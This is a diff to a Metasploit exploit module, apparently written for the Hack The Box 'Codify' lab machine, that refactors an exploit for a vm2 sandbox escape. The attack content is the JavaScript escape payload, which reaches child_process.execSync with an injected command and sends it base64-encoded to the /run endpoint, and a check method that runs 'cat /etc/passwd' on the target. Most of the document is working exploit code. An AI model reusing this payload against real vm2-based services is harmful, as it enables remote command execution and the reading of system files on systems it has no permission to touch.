@@ -7,7 +7,6 @@ class MetasploitModule < Msf::Exploit::Remote
   Rank = NormalRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html
 
   include Msf::Exploit::Remote::HttpClient
-  # include Msf::Exploit::Remote::HttpServer  # https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-write-a-browser-exploit-using-httpserver.html
 
   def initialize(info = {})
     super(
@@ -21,8 +20,8 @@ class MetasploitModule < Msf::Exploit::Remote
         'License' => MSF_LICENSE,
         'Author' => ['ClutchReboot'],
         'References' => [
-          [ 'URL', 'https://www.hackthebox.com/machines/codify'],
-          [ 'Vulnerability', 'https://github.com/patriksimek/vm2/security/advisories/GHSA-ch3r-j5x3-6q2m' ]
+          [ 'Hackthebox', 'https://www.hackthebox.com/machines/codify' ],
+          [ 'URL', 'https://github.com/patriksimek/vm2/security/advisories/GHSA-ch3r-j5x3-6q2m' ]
         ],
         'Payload' => {
           'BadChars' => "\x00"
@@ -51,8 +50,8 @@ class MetasploitModule < Msf::Exploit::Remote
     )
   end
 
-  def execute_command(cmd, _opts = {})
-    exploit_code = "err = {};
+  def create_vm2_payload(cmd)
+    return "err = {};
     const handler = {
         getPrototypeOf(target) {
             (function stack() {
@@ -68,19 +67,24 @@ class MetasploitModule < Msf::Exploit::Remote
     } catch ({constructor: c}) {
         c.constructor('return process')().mainModule.require('child_process').execSync(\"#{cmd}\");
     }"
+  end
 
-    send_request_cgi({
+  def execute_command(cmd, _opts = {})
+    return send_request_cgi({
       'method' => 'POST',
       'uri' => '/run',
       'ctype' => 'application/json',
       'data' => JSON.generate({
-        'code': Rex::Text.encode_base64(exploit_code)
+        'code': Rex::Text.encode_base64(create_vm2_payload(cmd))
       })
     })
   end
 
   def check
-    CheckCode::Vulnerable
+    res = execute_command('cat /etc/passwd')
+    if res && res.code == 200
+      CheckCode::Vulnerable
+    end
   end
 
   def exploit
@@ -89,7 +93,6 @@ class MetasploitModule < Msf::Exploit::Remote
       when :unix_cmd
         execute_command(payload.encoded)
       end
-
   end
 end
   
